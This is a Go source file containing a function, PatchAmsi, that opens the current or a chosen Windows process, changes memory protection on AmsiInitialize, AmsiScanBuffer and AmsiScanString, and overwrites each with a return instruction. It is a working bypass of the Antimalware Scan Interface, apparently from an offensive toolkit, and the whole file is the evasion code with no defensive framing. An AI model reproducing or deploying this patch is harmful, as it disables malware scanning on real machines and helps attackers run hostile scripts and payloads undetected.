package core

/*

References:


*/

import (
  //"errors"
  "fmt"
  "time"
  "unsafe"
  "syscall"

  "golang.org/x/sys/windows"
)

var amsi_patch = []byte{0xc3}

func PatchAmsi(pid int) (error) {
  
  amsidll := syscall.NewLazyDLL("amsi.dll") // Load DLLs
  kernel32 := syscall.NewLazyDLL("kernel32.dll")

  amsiScanBuffer := amsidll.NewProc("AmsiScanBuffer")
  amsiScanString := amsidll.NewProc("AmsiScanString")
  amsiInitialize := amsidll.NewProc("AmsiInitialize")
  openProcess := kernel32.NewProc("OpenProcess")
  closeHandle := kernel32.NewProc("CloseHandle")
  getCurrentProcess := kernel32.NewProc("GetCurrentProcess")
  virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
  writeProcessMemory := kernel32.NewProc("WriteProcessMemory")

  time.Sleep(100 * time.Millisecond)

  var handle uintptr
  var err error

  if (pid == 0) {
    handle, _, _ = getCurrentProcess.Call()
  } else {
    handle, _, _ = openProcess.Call(uintptr(0x1F0FFF), uintptr(0), uintptr(pid))
  }

  addresses := []uintptr{
    amsiInitialize.Addr(),
    amsiScanBuffer.Addr(),
    amsiScanString.Addr(),
  }

  var oldProtect uint32
  var old uint32

  time.Sleep(100 * time.Millisecond)

  for _, addr := range addresses {

    _, _, err = virtualProtectEx.Call(uintptr(handle), addr, uintptr(1), windows.PAGE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
    if err != nil {
      fmt.Println("error virtualProtectEx")
    }

    //writeProcessMemory.Call(uintptr(handle), addr, uintptr(unsafe.Pointer(&amsi_patch[0])), uintptr(len(amsi_patch)))
    r1, _, _ := writeProcessMemory.Call(uintptr(handle), addr, uintptr(unsafe.Pointer(&amsi_patch[0])), uintptr(len(amsi_patch)))
    if r1 == 0 {
      fmt.Println("error writeProcessMemory")
    }

    //virtualProtectEx.Call(uintptr(handle), addr, uintptr(1), uintptr(oldProtect), uintptr(unsafe.Pointer(&old)))
    _, _, err = virtualProtectEx.Call(uintptr(handle), addr, uintptr(1), uintptr(oldProtect), uintptr(unsafe.Pointer(&old)))
    if err != nil {
      fmt.Println("error virtualProtectEx")
    }

  }

  closeHandle.Call(handle)
  return nil
}


